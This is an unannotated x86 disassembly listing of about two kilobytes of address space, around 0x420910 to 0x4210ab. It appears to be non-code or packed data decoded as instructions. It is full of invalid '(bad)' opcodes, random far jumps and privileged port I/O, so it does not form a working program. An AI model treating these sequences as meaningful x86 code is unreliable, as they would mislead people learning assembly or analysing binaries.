  420910:	pusha  
  420911:	stc    
  420912:	es ret 
  420914:	leave  
  420915:	addr16 (bad) 
  420917:	xchg   edi,eax
  420918:	jmp    0x1fda:0x372bd72d
  42091f:	cdq    
  420920:	das    
  420921:	dec    ecx
  420922:	adc    esp,DWORD PTR [ebp+0x49758534]
  420928:	xor    al,0x37
  42092a:	test   al,0x83
  42092c:	bound  esp,QWORD PTR [edx+ecx*4-0x38df4572]
  420933:	test   eax,0x90aab00b
  420938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420939:	mov    esp,DWORD PTR [ebp+0x6a4f4a8a]
  42093f:	or     al,0x93
  420941:	or     DWORD PTR [esi-0x59f2afaf],eax
  420947:	outs   dx,BYTE PTR ds:[esi]
  420948:	loop   0x42093d
  42094a:	cmp    BYTE PTR [ebx+0x2b8e260b],dh
  420950:	(bad)  
  420951:	(bad)  [esi+0x246e8afd]
  420957:	mov    eax,ds:0xad206cce
  42095c:	je     0x4209a1
  42095e:	push   ss
  42095f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420960:	cmp    al,0x9b
  420962:	jb     0x420984
  420964:	pop    ss
  420965:	inc    ebx
  420966:	add    DWORD PTR [edi+0x5e2852e7],ebp
  42096c:	add    eax,0x7fe353cd
  420971:	or     esp,DWORD PTR [edi-0x3d]
  420974:	int    0x7e
  420976:	into   
  420977:	cmp    bl,BYTE PTR [edi+0x674b95dd]
  42097d:	in     al,0x63
  42097f:	jne    0x4209eb
  420981:	inc    esi
  420982:	jl     0x420946
  420984:	push   es
  420985:	xlat   BYTE PTR ds:[ebx]
  420986:	push   eax
  420987:	inc    esi
  420988:	inc    ecx
  420989:	xchg   BYTE PTR [ebx-0x6834b8d8],dh
  42098f:	(bad)  
  420991:	mov    eax,0xe2bff511
  420996:	xlat   BYTE PTR ds:[ebx]
  420997:	addr16 add ch,bh
  42099a:	enter  0xc7d9,0x1
  42099e:	sbb    DWORD PTR [esi-0x653cf6a6],ebx
  4209a4:	pop    es
  4209a5:	ins    DWORD PTR es:[edi],dx
  4209a6:	inc    esp
  4209a7:	stc    
  4209a8:	ror    BYTE PTR [ebp-0x24],0xbf
  4209ac:	pop    ebx
  4209ad:	xchg   ebp,eax
  4209ae:	stc    
  4209af:	xor    BYTE PTR [esi],bl
  4209b1:	or     DWORD PTR [ecx],0x6f
  4209b4:	test   eax,0xcf9b1520
  4209b9:	mov    ecx,eax
  4209bb:	mov    bh,0x5a
  4209bd:	(bad)
  4209c0:	adc    eax,0x11f2dcb3
  4209c5:	push   esi
  4209c6:	mov    ds:0x2940ffcb,eax
  4209cb:	adc    esp,eax
  4209cd:	retf   0xf822
  4209d0:	aam    0x28
  4209d2:	or     al,0x79
  4209d4:	push   ds
  4209d5:	mov    bl,0xcb
  4209d7:	pop    ebx
  4209d8:	sub    bh,BYTE PTR [eax]
  4209da:	mov    fs,WORD PTR [esp+ebp*2]
  4209dd:	fucomi st,st(7)
  4209df:	es cwde 
  4209e1:	adc    dl,ch
  4209e3:	cwde   
  4209e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209e5:	in     al,dx
  4209e6:	je     0x420a17
  4209e8:	cs jnp 0x420a3a
  4209eb:	and    al,0x4d
  4209ed:	mov    eax,es:0x8bf9a0c4
  4209f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209f4:	push   ebx
  4209f5:	arpl   cx,si
  4209f7:	xchg   ebp,eax
  4209f8:	dec    edi
  4209f9:	test   al,0x6
  4209fb:	les    ebx,FWORD PTR [ebp+0x3d]
  4209fe:	xchg   ebp,eax
  4209ff:	cmp    edi,DWORD PTR [edx]
  420a01:	jo     0x4209e5
  420a03:	repnz fdiv QWORD PTR [edx+edi*4]
  420a07:	sub    ch,BYTE PTR [ecx]
  420a09:	xlat   BYTE PTR ds:[ebx]
  420a0a:	nop
  420a0b:	inc    ebx
  420a0c:	std    
  420a0d:	dec    esi
  420a0e:	dec    ebp
  420a0f:	mov    BYTE PTR ds:0xfb7caad3,al
  420a15:	sbb    esi,DWORD PTR [eax]
  420a17:	jne    0x420a3f
  420a19:	pop    es
  420a1a:	push   edi
  420a1b:	xlat   BYTE PTR ds:[ebx]
  420a1c:	pop    esi
  420a1d:	add    al,0x7b
  420a1f:	cmc    
  420a20:	mov    ds:0x13d52a53,al
  420a25:	inc    ebx
  420a26:	push   ds
  420a27:	repnz xor edi,ebp
  420a2a:	pop    ds
  420a2b:	mov    ds:0xdf68b088,eax
  420a30:	mov    al,ds:0xa0e0dd58
  420a35:	jecxz  0x4209dc
  420a37:	adc    al,0x9d
  420a39:	xchg   ebp,eax
  420a3a:	sbb    edi,edx
  420a3c:	cwde   
  420a3d:	add    DWORD PTR [ecx-0x24],0x42
  420a41:	adc    eax,0xf7de01c3
  420a46:	popa   
  420a47:	gs push ss
  420a49:	mov    dh,0x9d
  420a4b:	retf   0x59c7
  420a4e:	mov    bh,0x5c
  420a50:	sbb    edi,DWORD PTR [esp+ecx*2-0xef83f39]
  420a57:	lods   eax,DWORD PTR ds:[esi]
  420a58:	outs   dx,DWORD PTR ds:[esi]
  420a59:	out    dx,eax
  420a5a:	call   FWORD PTR [ebx]
  420a5c:	sbb    al,0x91
  420a5e:	ins    DWORD PTR es:[edi],dx
  420a5f:	js     0x420a99
  420a61:	ins    DWORD PTR es:[edi],dx
  420a62:	ret    
  420a63:	stc    
  420a64:	dec    eax
  420a65:	mov    edi,0x4e8ff64f
  420a6a:	and    BYTE PTR [ebp+0x1934be68],bl
  420a70:	in     eax,0xe5
  420a72:	or     al,BYTE PTR [ecx+0x52235098]
  420a78:	xor    BYTE PTR [ebx-0x67bd29c7],ah
  420a7e:	call   0xe703f4d8
  420a83:	lods   al,BYTE PTR ds:[esi]
  420a84:	pop    ds
  420a85:	sub    dl,bl
  420a87:	out    0xaa,al
  420a89:	add    edi,DWORD PTR [edi-0x344e7a29]
  420a8f:	or     edi,edi
  420a91:	pop    es
  420a92:	or     eax,0x9ad4d6ed
  420a97:	imul   BYTE PTR [ebx+0x73]
  420a9a:	xchg   edi,eax
  420a9b:	mov    ch,dl
  420a9d:	jle    0x420b01
  420a9f:	xor    eax,0xc6fd25bc
  420aa4:	retf   
  420aa5:	outs   dx,BYTE PTR ds:[esi]
  420aa6:	cli    
  420aa7:	in     eax,0xf7
  420aa9:	push   ss
  420aaa:	rol    DWORD PTR [esi-0x5c1fe54d],cl
  420ab0:	sahf   
  420ab1:	jns    0x420a5b
  420ab3:	ds mov dl,0x62
  420ab6:	add    cl,BYTE PTR [edi]
  420ab8:	enter  0x16d7,0x40
  420abc:	sbb    ebp,DWORD PTR [ebp-0x3bb3b902]
  420ac2:	jns    0x420ab1
  420ac4:	mov    DWORD PTR [esi+edi*1+0x4e6e4d1f],ebx
  420acb:	ss cmp eax,0x6b565c34
  420ad1:	mov    ecx,DWORD PTR [ecx-0x26]
  420ad4:	aaa    
  420ad5:	pop    ecx
  420ad6:	sahf   
  420ad7:	hlt    
  420ad8:	sub    eax,0x8ea0f1ea
  420add:	xchg   edx,eax
  420ade:	cmp    edi,ecx
  420ae0:	scas   eax,DWORD PTR es:[edi]
  420ae1:	xchg   esp,eax
  420ae2:	pop    es
  420ae3:	scas   eax,DWORD PTR es:[edi]
  420ae4:	clc    
  420ae5:	fisubr DWORD PTR [eax-0x4f]
  420ae8:	loope  0x420b2e
  420aea:	sub    al,0xc3
  420aec:	cmp    BYTE PTR [eax+0x53ceb4e9],dh
  420af2:	in     al,dx
  420af3:	test   edx,ebp
  420af5:	jmp    0x70d4:0x37b7a417
  420afc:	call   0xa5ca3eb3
  420b01:	shr    DWORD PTR cs:[edi+0x781e4e24],1
  420b08:	lds    ecx,FWORD PTR [edi]
  420b0a:	jecxz  0x420a8d
  420b0c:	mov    dl,0xa
  420b0e:	xor    eax,0x95706cfa
  420b13:	fsub   QWORD PTR [ecx+0x1c]
  420b16:	inc    edx
  420b17:	bound  esi,QWORD PTR [eax+0x46830735]
  420b1d:	bound  esi,QWORD PTR [ecx]
  420b1f:	pop    es
  420b20:	aam    0x92
  420b22:	and    eax,ecx
  420b24:	popf   
  420b25:	lahf   
  420b26:	enter  0xffc9,0x76
  420b2a:	mov    ebp,0xa592e800
  420b2f:	xor    eax,0x966cab8b
  420b34:	ins    DWORD PTR es:[edi],dx
  420b35:	mov    eax,ds:0x668bcb8d
  420b3a:	dec    edx
  420b3b:	push   cs
  420b3c:	mov    edi,0x89337a89
  420b41:	mov    ch,0x30
  420b43:	sub    DWORD PTR [edi],eax
  420b45:	fucomi st,st(6)
  420b47:	jecxz  0x420b4c
  420b49:	lods   al,BYTE PTR ds:[esi]
  420b4a:	mov    ebx,0x1e4a8c04
  420b4f:	ds jecxz 0x420b69
  420b52:	test   BYTE PTR [ecx],ah
  420b54:	cld    
  420b55:	into   
  420b56:	adc    al,0xfd
  420b58:	ja     0x420bcc
  420b5a:	pop    es
  420b5b:	hlt    
  420b5c:	es mov ah,0xf7
  420b5f:	xor    ebx,eax
  420b61:	mov    edx,0xf9b0a0f1
  420b66:	(bad)  
  420b67:	mov    al,ds:0xb86f47
  420b6c:	pop    esi
  420b6d:	mov    al,0x28
  420b6f:	call   0xe394:0xf6cd41c4
  420b76:	mov    ecx,DWORD PTR [eax-0x54]
  420b79:	xchg   DWORD PTR [edi+0x54],edx
  420b7c:	mov    esi,0xb8092ba4
  420b81:	dec    ebp
  420b82:	ja     0x420b48
  420b84:	sbb    eax,0xacb668c5
  420b89:	out    dx,eax
  420b8a:	shl    BYTE PTR [edi],1
  420b8c:	iret   
  420b8d:	test   BYTE PTR [eax-0x6],0x4
  420b91:	push   cs
  420b92:	inc    ebx
  420b93:	jg     0x420b82
  420b95:	aad    0x35
  420b97:	add    ecx,ecx
  420b99:	retf   
  420b9a:	stc    
  420b9b:	mov    esi,DWORD PTR [edi+0x41ca9f01]
  420ba1:	sahf   
  420ba2:	int    0xb0
  420ba4:	mov    cl,0xfa
  420ba6:	nop
  420ba7:	dec    edi
  420ba8:	and    BYTE PTR [ecx],ch
  420baa:	sub    ebx,DWORD PTR [esi+ebp*4]
  420bad:	push   cs
  420bae:	jp     0x420bb3
  420bb0:	add    eax,0x586a9f76
  420bb5:	cmp    al,0x49
  420bb7:	daa    
  420bb8:	iret   
  420bb9:	or     BYTE PTR [esi],dl
  420bbb:	xor    BYTE PTR [ebx+0x47947fb4],0x27
  420bc2:	xor    ch,dh
  420bc4:	imul   eax,DWORD PTR [edx-0x1fd1c528],0xc4fa808c
  420bce:	sar    ecx,cl
  420bd0:	dec    edi
  420bd1:	nop
  420bd2:	inc    esi
  420bd3:	and    edi,DWORD PTR [eax]
  420bd5:	push   edi
  420bd6:	mov    ecx,0xa837743
  420bdb:	outs   dx,DWORD PTR ds:[esi]
  420bdc:	cs int 0x4d
  420bdf:	shl    BYTE PTR [ebx-0xb],1
  420be2:	loop   0x420b7c
  420be4:	(bad)  
  420be5:	xor    esp,DWORD PTR [edi+0x43]
  420be8:	or     esi,eax
  420bea:	out    dx,al
  420beb:	sbb    cl,BYTE PTR [ebp-0x46]
  420bee:	sub    eax,0x776f2075
  420bf3:	fstp   TBYTE PTR [ebp-0x5b624733]
  420bf9:	pop    edi
  420bfa:	ja     0x420bae
  420bfc:	xlat   BYTE PTR ds:[ebx]
  420bfd:	neg    DWORD PTR [ecx]
  420bff:	fst    st(5)
  420c01:	fstp   QWORD PTR [eax]
  420c03:	jns    0x420b8a
  420c05:	push   es
  420c06:	test   al,0x3f
  420c08:	jns    0x420c41
  420c0a:	mov    bl,0xc5
  420c0c:	jnp    0x420bf1
  420c0e:	xchg   edx,eax
  420c0f:	and    bl,BYTE PTR gs:[eax+ebx*1-0x6c]
  420c14:	mov    ch,0x57
  420c16:	mov    eax,0x51755dc8
  420c1b:	add    bl,BYTE PTR [esi]
  420c1d:	mov    al,ds:0x85a8ed13
  420c22:	aaa    
  420c23:	mov    dh,0xf
  420c25:	sti    
  420c26:	jl     0x420bb7
  420c28:	push   edi
  420c29:	pop    ebp
  420c2a:	(bad)  
  420c2b:	daa    
  420c2c:	pop    ds
  420c2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c2e:	mov    esi,0x7acc1c05
  420c33:	imul   ebx,esp,0x79
  420c36:	rol    BYTE PTR [ebx],0x95
  420c39:	inc    ebp
  420c3a:	dec    ebx
  420c3b:	xchg   ebx,eax
  420c3c:	dec    ecx
  420c3d:	cmp    eax,0x112c2e87
  420c42:	jg     0x420bdc
  420c44:	ret    0xe575
  420c47:	push   eax
  420c48:	das    
  420c49:	stos   BYTE PTR es:[edi],al
  420c4a:	dec    ebp
  420c4b:	xchg   ebp,eax
  420c4c:	psraw  mm6,QWORD PTR [edi]
  420c4f:	in     al,dx
  420c50:	popf   
  420c51:	enter  0x9096,0xca
  420c55:	pcmpeqw mm3,QWORD PTR [eax]
  420c58:	mov    cl,cl
  420c5a:	js     0x420cca
  420c5c:	sbb    BYTE PTR [edi],ah
  420c5e:	sti    
  420c5f:	lods   eax,DWORD PTR ds:[esi]
  420c60:	out    0x99,al
  420c62:	cli    
  420c63:	adc    al,0xf6
  420c65:	pop    ds
  420c66:	add    eax,0x1e612f92
  420c6b:	mov    ds:0x258b0bb7,al
  420c70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c71:	jg     0x420c00
  420c73:	dec    esi
  420c74:	mov    al,0x4b
  420c76:	xor    eax,0x3c544492
  420c7b:	sub    edi,DWORD PTR [edi+0x73f0aeac]
  420c81:	inc    BYTE PTR [ecx+0x75]
  420c84:	xchg   ecx,eax
  420c85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c86:	pop    es
  420c87:	nop
  420c88:	mov    eax,0xeea6cf1b
  420c8d:	ret    
  420c8e:	out    0x6b,eax
  420c90:	call   0xd2eb6008
  420c95:	cdq    
  420c96:	jg     0x420c1a
  420c98:	sub    BYTE PTR [edx],cl
  420c9a:	jmp    0x67a:0x52b894b7
  420ca1:	pop    ss
  420ca2:	mov    eax,ds:0x58f9cc4e
  420ca7:	jge    0x420c98
  420ca9:	pop    ebx
  420caa:	seta   BYTE PTR [ebx]
  420cad:	adc    ah,0x31
  420cb0:	cmp    al,0x50
  420cb2:	push   ecx
  420cb3:	dec    ebp
  420cb4:	pop    ebx
  420cb5:	pop    edx
  420cb6:	or     esi,DWORD PTR [esi-0x5f]
  420cb9:	jae    0x420cce
  420cbb:	inc    edi
  420cbc:	outs   dx,BYTE PTR ds:[esi]
  420cbd:	add    al,0xdf
  420cbf:	scas   al,BYTE PTR es:[edi]
  420cc0:	dec    esp
  420cc1:	stos   DWORD PTR es:[edi],eax
  420cc2:	mov    dh,0x53
  420cc4:	cmp    BYTE PTR [eax],cl
  420cc6:	out    dx,eax
  420cc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cc8:	cli    
  420cc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cca:	mov    eax,ds:0xb17ae87f
  420ccf:	cmc    
  420cd0:	ds sub al,0x1a
  420cd3:	fs pop edi
  420cd5:	pop    eax
  420cd6:	je     0x420d2c
  420cd8:	cs cmp eax,0x525b7eb
  420cde:	push   ebp
  420cdf:	jp     0x420d39
  420ce1:	add    DWORD PTR [ebx-0x7d],esi
  420ce4:	push   edx
  420ce5:	xor    eax,0x2e493a4c
  420cea:	aam    0xab
  420cec:	frstor [edx+eiz*2]
  420cef:	leave  
  420cf0:	mov    dl,0xfb
  420cf2:	leave  
  420cf3:	out    dx,eax
  420cf4:	sbb    DWORD PTR [eax+eax*4+0x7663b64d],edx
  420cfb:	xor    DWORD PTR [edx-0x459a9970],0x44aed224
  420d05:	xchg   BYTE PTR [ebp+0x46],bl
  420d08:	sub    eax,DWORD PTR [ebx+0x4]
  420d0b:	ins    DWORD PTR es:[edi],dx
  420d0c:	cmc    
  420d0d:	call   0xaf5c:0x62986cb8
  420d14:	or     ah,al
  420d16:	pusha  
  420d17:	dec    esp
  420d18:	inc    edi
  420d19:	aad    0x10
  420d1b:	mov    DWORD PTR [eax+0x3c],eax
  420d1e:	inc    ebp
  420d1f:	mov    WORD PTR [ecx],fs
  420d21:	push   esi
  420d22:	fiadd  WORD PTR [edi-0x7e]
  420d25:	sti    
  420d26:	(bad)  [edi+eiz*2+0x73]
  420d2a:	popf   
  420d2b:	mov    BYTE PTR [ecx+0x1d7e3bf8],bl
  420d31:	jle    0x420d31
  420d33:	(bad)  
  420d34:	push   ebx
  420d35:	and    BYTE PTR [eax],ah
  420d37:	cwde   
  420d38:	adc    ebp,DWORD PTR [edx-0x7b]
  420d3b:	out    0x21,al
  420d3d:	stos   DWORD PTR es:[edi],eax
  420d3e:	stc    
  420d3f:	and    edx,DWORD PTR [edx+0x238a93dd]
  420d45:	div    BYTE PTR [bx+di-0x545a]
  420d4a:	xor    eax,0xf254bea5
  420d4f:	mov    ds:0x734af276,eax
  420d54:	aaa    
  420d55:	jne    0x420d4a
  420d57:	dec    ebx
  420d58:	sub    ch,BYTE PTR [ebp-0x687c6444]
  420d5e:	and    eax,edi
  420d60:	push   esi
  420d61:	pusha  
  420d62:	jb     0x420de1
  420d64:	jno    0x420d81
  420d66:	pop    edx
  420d67:	nop
  420d68:	cmp    eax,0xa93a2ffc
  420d6d:	loope  0x420d70
  420d6f:	pop    es
  420d70:	add    ah,BYTE PTR [edi-0x31]
  420d73:	dec    esi
  420d74:	jno    0x420de2
  420d76:	cmp    eax,0xf11c8123
  420d7b:	mov    al,ds:0xc0ddedc9
  420d80:	push   ecx
  420d81:	xor    ah,dh
  420d83:	lahf   
  420d84:	jno    0x420d4c
  420d86:	mov    dl,ah
  420d88:	fnstcw WORD PTR [ebx+0xe]
  420d8b:	sub    ah,BYTE PTR [esi]
  420d8d:	mov    edx,esi
  420d8f:	sbb    eax,0xd2a4ce37
  420d94:	sbb    DWORD PTR [edx-0x18],edx
  420d97:	std    
  420d98:	(bad)  
  420d99:	out    dx,eax
  420d9a:	push   esp
  420d9b:	push   esi
  420d9c:	pop    esi
  420d9d:	mov    dl,BYTE PTR [esi]
  420d9f:	push   ds
  420da0:	nop
  420da1:	lahf   
  420da2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420da3:	pop    ecx
  420da4:	sbb    DWORD PTR ds:0x6035ad76,0x50
  420dab:	enter  0x294b,0x42
  420daf:	popa   
  420db0:	pop    esp
  420db1:	ins    DWORD PTR es:[edi],dx
  420db2:	lods   al,BYTE PTR ds:[esi]
  420db3:	adc    al,0x37
  420db5:	adc    BYTE PTR [eax+ecx*8+0x785a72fb],bl
  420dbc:	mov    eax,ds:0x3d4a4c8e
  420dc1:	sub    eax,0xde92b24c
  420dc6:	push   ss
  420dc7:	jo     0x420d7e
  420dc9:	jnp    0x420d89
  420dcb:	sbb    esp,DWORD PTR ds:0x5d16e13a
  420dd1:	pop    edi
  420dd2:	hlt    
  420dd3:	inc    DWORD PTR [edx]
  420dd5:	pop    es
  420dd6:	outs   dx,DWORD PTR ds:[esi]
  420dd7:	push   edi
  420dd8:	div    DWORD PTR [edi-0x175006f6]
  420dde:	sbb    eax,0x7d32c076
  420de3:	cli    
  420de4:	js     0x420da6
  420de6:	push   cs
  420de7:	mov    ebp,0x477f49cf
  420dec:	fld    st(7)
  420dee:	data16 setnp cl
  420df2:	xor    DWORD PTR [ebp-0x91a7bb8],edi
  420df8:	fist   DWORD PTR [edi]
  420dfa:	mov    bl,0xdd
  420dfc:	sbb    al,BYTE PTR [ecx-0x27]
  420dff:	push   ecx
  420e00:	adc    DWORD PTR [edi-0x745b2e1e],eax
  420e06:	sbb    al,0x4a
  420e08:	mov    WORD PTR [ecx+esi*1],?
  420e0b:	aad    0xbc
  420e0d:	loope  0x420e44
  420e0f:	or     ch,BYTE PTR [edi+0x25]
  420e12:	inc    ecx
  420e13:	dec    esi
  420e14:	fisttp QWORD PTR [esi+0x2e]
  420e17:	and    al,0x76
  420e19:	lods   al,BYTE PTR ds:[esi]
  420e1a:	xor    cl,dl
  420e1c:	pop    edi
  420e1d:	and    BYTE PTR [edi+ebx*1-0x43128f30],cl
  420e24:	out    dx,eax
  420e25:	fisttp WORD PTR [edi-0x6d]
  420e28:	jbe    0x420e2e
  420e2a:	xchg   BYTE PTR [ebx-0x4e675da6],bl
  420e30:	and    ebp,0x22
  420e33:	pop    ecx
  420e34:	cmp    DWORD PTR [edx+edi*8+0x5e],esp
  420e38:	push   edi
  420e39:	jb     0x420e21
  420e3b:	(bad)  
  420e3d:	dec    eax
  420e3e:	jb     0x420e0a
  420e40:	(bad)  
  420e41:	pushf  
  420e42:	test   BYTE PTR [esi],0xf1
  420e45:	pop    edi
  420e46:	imul   edx,ebp,0x64
  420e49:	push   ss
  420e4a:	fnstenv [edi]
  420e4c:	jecxz  0x420e95
  420e4e:	jle    0x420e40
  420e50:	adc    DWORD PTR [ecx-0x2834e8c4],esi
  420e56:	xchg   edx,eax
  420e57:	nop
  420e58:	mov    ebp,0x89e4cde7
  420e5d:	je     0x420e91
  420e5f:	call   0x56269653
  420e64:	and    BYTE PTR [esi-0x14],al
  420e67:	(bad)  
  420e68:	xchg   esp,eax
  420e69:	mov    WORD PTR [edi],cs
  420e6b:	in     al,0xdd
  420e6d:	imul   ebp,ecx,0xd81d98e9
  420e73:	cdq    
  420e74:	test   DWORD PTR [esi],0x13b69bf6
  420e7a:	repnz xor al,0x9d
  420e7d:	jae    0x420e1f
  420e7f:	dec    ecx
  420e80:	mov    eax,ds:0x3800c25
  420e85:	(bad)  
  420e86:	std    
  420e87:	cmp    eax,0x3c626e2b
  420e8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e8d:	dec    edi
  420e8e:	nop
  420e8f:	mov    bh,BYTE PTR [ebp+0x63bb7e6c]
  420e95:	scas   al,BYTE PTR es:[edi]
  420e96:	adc    eax,0xf68790a7
  420e9b:	pop    edi
  420e9c:	add    DWORD PTR gs:[ecx-0x38c407a6],ecx
  420ea3:	jns    0x420e42
  420ea5:	mov    WORD PTR [edi-0x6f],?
  420ea8:	xor    esp,DWORD PTR [ebp+0x128b081]
  420eae:	mov    dl,0x4
  420eb0:	add    eax,0x2856c427
  420eb5:	cmc    
  420eb6:	fistp  WORD PTR [ebp+esi*8-0x2a5af66c]
  420ebd:	adc    al,0xa4
  420ebf:	mov    al,ds:0x7f26da46
  420ec4:	push   0x5706745
  420ec9:	int3   
  420eca:	mov    edi,0x6df2a778
  420ecf:	mov    esp,DWORD PTR [ebx-0x4d975c84]
  420ed5:	rol    BYTE PTR [ebx-0x13],1
  420ed8:	jo     0x420f1e
  420eda:	add    al,0x8b
  420edc:	test   DWORD PTR [ebx+0x3bd98eae],esp
  420ee2:	dec    esi
  420ee3:	aas    
  420ee4:	in     al,0x88
  420ee6:	inc    eax
  420ee7:	xor    DWORD PTR [edx+0x16],ecx
  420eea:	lds    esi,FWORD PTR [esi-0x28707f71]
  420ef0:	add    eax,0x6ae45486
  420ef5:	or     eax,ebp
  420ef7:	xor    DWORD PTR [esi],edx
  420ef9:	aaa    
  420efa:	inc    esp
  420efb:	(bad)  
  420efc:	xor    bh,ah
  420efe:	sub    BYTE PTR [edx],bl
  420f00:	xor    BYTE PTR [esi],bl
  420f02:	sub    al,0x4e
  420f04:	popa   
  420f05:	push   ebp
  420f06:	fld    st(5)
  420f08:	push   ecx
  420f09:	adc    ah,0x92
  420f0c:	inc    esi
  420f0d:	dec    ecx
  420f0e:	inc    esp
  420f0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f10:	push   esp
  420f11:	sahf   
  420f12:	xchg   edx,eax
  420f13:	fldenv [eax+eiz*4]
  420f16:	sti    
  420f17:	into   
  420f18:	xchg   esp,eax
  420f19:	dec    esi
  420f1a:	mov    BYTE PTR [esp+edi*4+0x6a587463],ch
  420f21:	(bad)  
  420f22:	gs jge 0x420f7c
  420f25:	ret    
  420f26:	add    BYTE PTR [esi],cl
  420f28:	retf   0xd131
  420f2b:	lds    esi,FWORD PTR [esi]
  420f2d:	jecxz  0x420f63
  420f2f:	cmp    DWORD PTR fs:[esi-0x17],esp
  420f33:	lahf   
  420f34:	ret    0x7b0a
  420f37:	mov    ebp,0xac29f510
  420f3c:	out    dx,al
  420f3d:	std    
  420f3e:	pop    eax
  420f3f:	shr    DWORD PTR [esi+eax*2],1
  420f42:	popf   
  420f43:	jge    0x420f97
  420f45:	call   0x803c9182
  420f4a:	sub    cl,BYTE PTR [ebx-0x15]
  420f4d:	xchg   ecx,eax
  420f4e:	adc    eax,0x76c6c33d
  420f53:	dec    esi
  420f54:	pusha  
  420f55:	push   ebp
  420f56:	ins    BYTE PTR es:[edi],dx
  420f57:	push   es
  420f58:	data16 jo 0x420f0d
  420f5b:	mov    al,ds:0x5003adda
  420f60:	loop   0x420f59
  420f62:	mov    ch,cl
  420f64:	(bad)  
  420f65:	sti    
  420f66:	mov    ds:0xa568d24,al
  420f6b:	xor    ecx,esp
  420f6d:	scas   eax,DWORD PTR es:[edi]
  420f6e:	or     dl,dh
  420f70:	mov    edi,0xfe9511e9
  420f75:	ret    
  420f76:	add    BYTE PTR [esi-0x3a7fefb0],dh
  420f7c:	adc    BYTE PTR [eax],bh
  420f7e:	jecxz  0x420f99
  420f80:	nop
  420f81:	scas   eax,DWORD PTR es:[edi]
  420f82:	inc    esi
  420f83:	imul   edx,DWORD PTR [ebx+0x442708f2],0xa7e88b34
  420f8d:	js     0x420f1d
  420f8f:	das    
  420f90:	dec    ebp
  420f91:	cmc    
  420f92:	mov    cl,0x9e
  420f94:	dec    esi
  420f95:	mov    al,ds:0x50bd33bb
  420f9a:	hlt    
  420f9b:	loop   0x420fcd
  420f9d:	out    dx,eax
  420f9e:	sar    DWORD PTR [esi],0xf6
  420fa1:	xchg   edx,eax
  420fa2:	lods   al,BYTE PTR ds:[esi]
  420fa3:	shl    ah,1
  420fa5:	mov    ds:0x5a2f4c53,eax
  420faa:	push   ds
  420fab:	lods   eax,DWORD PTR ds:[esi]
  420fac:	out    dx,eax
  420fad:	stos   DWORD PTR es:[edi],eax
  420fae:	mov    dh,0xdb
  420fb0:	mov    bh,0x69
  420fb2:	mov    WORD PTR [edx-0x4d],ds
  420fb5:	ret    
  420fb6:	repnz pop ecx
  420fb8:	jmp    0xfc1c71c8
  420fbd:	inc    BYTE PTR [ebx]
  420fbf:	xor    DWORD PTR [ecx+0x613d9f77],ebx
  420fc5:	cdq    
  420fc6:	mov    bl,0x35
  420fc8:	lock add al,0xa6
  420fcb:	jmp    DWORD PTR [edi+edi*1+0x2c]
  420fcf:	pop    ebp
  420fd0:	aas    
  420fd1:	scas   eax,DWORD PTR es:[edi]
  420fd2:	int3   
  420fd3:	jecxz  0x420fb3
  420fd5:	jmp    0xad8b:0xf46a3a94
  420fdc:	scas   al,BYTE PTR es:[edi]
  420fdd:	cmp    ah,cl
  420fdf:	retf   0x87db
  420fe2:	call   FWORD PTR [edi+0x3]
  420fe5:	mov    bl,0x83
  420fe7:	ss ret 0x9b
  420feb:	adc    al,0x45
  420fed:	aam    0xe0
  420fef:	or     bh,al
  420ff1:	mov    cl,0xb
  420ff3:	ins    BYTE PTR es:[edi],dx
  420ff4:	cmc    
  420ff5:	mov    ds:0x656aaee9,al
  420ffa:	jae    0x420fd0
  420ffc:	and    dh,BYTE PTR [edx+ebp*1-0x306dd6]
  421003:	mov    edx,0x450fa3e4
  421008:	je     0x420fd2
  42100a:	jg     0x421068
  42100c:	cmp    BYTE PTR [ebx+0x1ed3194a],dh
  421012:	cmp    DWORD PTR [ebx-0x5a],0xaa36ffc3
  421019:	xor    BYTE PTR [ebp+0x27],ah
  42101c:	pop    es
  42101d:	sub    edx,DWORD PTR [edi]
  42101f:	mov    esp,0x44b518c1
  421024:	xchg   dh,bl
  421026:	mov    dl,0xe7
  421028:	mov    ah,0x89
  42102a:	or     DWORD PTR [ebp-0x7e41c5e7],ebp
  421030:	jg     0x42101f
  421032:	jg     0x42102d
  421034:	pop    ecx
  421035:	cld    
  421036:	add    eax,0xf4adc969
  42103b:	and    DWORD PTR [ebx],ebp
  42103d:	pop    esp
  42103e:	sbb    al,0xcf
  421040:	out    0x78,al
  421042:	xor    DWORD PTR [ebx-0x6d],ebx
  421045:	aad    0xe9
  421047:	test   DWORD PTR [eax+esi*8-0x7d],eax
  42104b:	lods   al,BYTE PTR ds:[esi]
  42104c:	push   ds
  42104d:	jns    0x421019
  42104f:	out    0xfa,al
  421051:	call   0xdfbd00d8
  421056:	jns    0x421011
  421058:	inc    ecx
  421059:	idiv   BYTE PTR [eax-0x28672200]
  42105f:	das    
  421060:	out    0xd7,eax
  421062:	mov    ebx,0xf5173f5a
  421067:	xchg   BYTE PTR [esp+edx*2-0x6d],al
  42106b:	call   0x2ed9:0xb19ac6be
  421072:	std    
  421073:	xor    ecx,DWORD PTR [edx+0x73]
  421076:	bound  eax,QWORD PTR [ebx-0x3124b146]
  42107c:	popa   
  42107d:	enter  0x4fe7,0xc6
  421081:	mov    bl,0x37
  421083:	retf   0x6e55
  421086:	and    BYTE PTR [eax+0x6918ae7a],ah
  42108c:	dec    eax
  42108d:	adc    ebx,DWORD PTR [ebx+0x3fb0fc8c]
  421093:	dec    esp
  421094:	(bad)  
  421095:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421096:	lock cmp BYTE PTR [ebp-0x3ea7128e],cl
  42109d:	dec    esp
  42109e:	rcl    DWORD PTR [edi],1
  4210a0:	jns    0x42110a
  4210a2:	pop    ss
  4210a3:	mov    cl,0x21
  4210a5:	cs cmp eax,0x8f52fc4b
  4210ab:	inc    esi
